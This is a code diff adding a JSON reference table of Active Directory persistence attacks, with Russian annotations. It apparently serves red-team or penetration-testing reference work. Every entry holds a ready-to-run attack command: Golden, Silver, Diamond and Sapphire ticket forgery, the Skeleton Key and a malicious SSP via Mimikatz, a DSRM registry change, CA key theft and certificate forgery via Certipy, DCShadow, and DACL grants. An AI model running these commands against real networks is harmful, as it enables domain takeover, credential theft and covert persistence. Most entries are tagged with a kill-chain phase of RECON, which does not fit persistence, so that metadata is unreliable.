@@ -1,0 +1,142 @@
+[
+  {
+    "condition": "Persistence",
+    "attack_type": "ADD DA (Add Domain Admin)",
+    "tool": "net.exe",
+    "req": "Domain Admin privileges",
+    "command": "net group \"domain admins\" myuser /add /domain",
+    "profit": "Domain Admin Account",
+    "critical_note": "Легитимное добавление пользователя в группу Domain Admins средствами ОС Windows.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Golden Ticket",
+    "tool": "Impacket (ticketer.py)",
+    "req": "KRBTGT AES key, Domain SID",
+    "command": "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+    "profit": "TGT (Forged)",
+    "critical_note": "Генерация поддельного TGT (Ticket Granting Ticket) вне Windows с использованием ключа KRBTGT.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Golden Ticket",
+    "tool": "Mimikatz",
+    "req": "KRBTGT Hash, Domain SID, Local Admin",
+    "command": "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /aes256:<krbtgt_aes256> /ptt\"",
+    "profit": "Domain Admin (via PTT)",
+    "critical_note": "Создание и инъекция (Pass-The-Ticket) Золотого билета в текущую сессию через Mimikatz.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Silver Ticket",
+    "tool": "Mimikatz",
+    "req": "Service Account Hash (Machine Key), Domain SID",
+    "command": "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt\"",
+    "profit": "Service Access (TGS)",
+    "critical_note": "Подделка TGS (Service Ticket) для конкретного сервиса без общения с KDC (Silver Ticket).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Silver Ticket",
+    "tool": "Impacket (ticketer.py)",
+    "req": "Machine NT Hash, Domain SID",
+    "command": "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+    "profit": "TGS/TGT (Forged)",
+    "critical_note": "Генерация билета с использованием хеша машинной учетной записи через Impacket.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Directory Service Restore Mode (DSRM)",
+    "tool": "PowerShell",
+    "req": "Local Admin on DC",
+    "command": "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD",
+    "profit": "DSRM Logon Persistence",
+    "critical_note": "Изменение реестра (DsrmAdminLogonBehavior=2) для разрешения входа под учетной записью DSRM админа в сетевом режиме.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Skeleton Key",
+    "tool": "Mimikatz",
+    "req": "Domain Admin, Debug Privileges",
+    "command": "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\"",
+    "profit": "Master Password Access",
+    "critical_note": "Инъекция в процесс LSASS на контроллере домена, позволяющая входить под любым пользователем с мастер-паролем 'mimikatz'.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Custom SSP",
+    "tool": "Mimikatz",
+    "req": "Local Admin / SYSTEM",
+    "command": "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\"",
+    "profit": "Plaintext Credentials",
+    "critical_note": "Внедрение вредоносного SSP (Security Support Provider) в память для логирования паролей в открытом виде (по умолчанию в C:\\Windows\\System32\\kiwissp.log).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Golden certificate",
+    "tool": "Certipy (Backup)",
+    "req": "CA Server Access / Credentials",
+    "command": "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
+    "profit": "CA Private Key",
+    "critical_note": "Бекап центра сертификации (AD CS) для извлечения закрытого ключа CA.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Golden certificate",
+    "tool": "Certipy (Forge)",
+    "req": "CA Private Key",
+    "command": "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'",
+    "profit": "Forged Certificate",
+    "critical_note": "Выпуск поддельного сертификата для любого пользователя, используя украденный ключ CA.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Diamond ticket",
+    "tool": "Impacket (ticketer.py)",
+    "req": "KRBTGT Key, Valid User Credentials",
+    "command": "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' <anyuser>",
+    "profit": "TGT (Modified PAC)",
+    "critical_note": "Атака Diamond Ticket: запрос легитимного TGT, его расшифровка, модификация PAC (групп) и переподпись.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "Saphire Ticket",
+    "tool": "Impacket (ticketer.py)",
+    "req": "KRBTGT Key, Valid Credentials, Impersonation Target",
+    "command": "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'",
+    "profit": "TGT (PAC Impersonation)",
+    "critical_note": "Атака Sapphire Ticket: подмена PAC в билете данными PAC легитимного (целевого) пользователя.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "DC shadow",
+    "tool": "Mimikatz (Implied)",
+    "req": "Domain Admin / SYSTEM",
+    "command": "mimikatz \"lsadump::dcshadow /object:<target_user> /attribute:<attribute> /value:<value>\" \"lsadump::dcshadow /push\"",
+    "profit": "Replication Persistence",
+    "critical_note": "Эмуляция поддельного контроллера домена для внедрения изменений в AD в обход SIEM. (Команда приведена справочно, на скриншоте отсутствовала).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Persistence",
+    "attack_type": "ACL manipulation",
+    "tool": "PowerView / PowerSploit (Implied)",
+    "req": "WriteDacl / Owner Access",
+    "command": "Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <attacker_user> -Rights All",
+    "profit": "Hidden Rights (DACL)",
+    "critical_note": "Модификация списков контроля доступа (DACL) для скрытого предоставления прав (например, DCSync) пользователю. (Команда приведена справочно, на скриншоте отсутствовала).",
+    "kill_chain_phase": "RECON"
+  }
+]
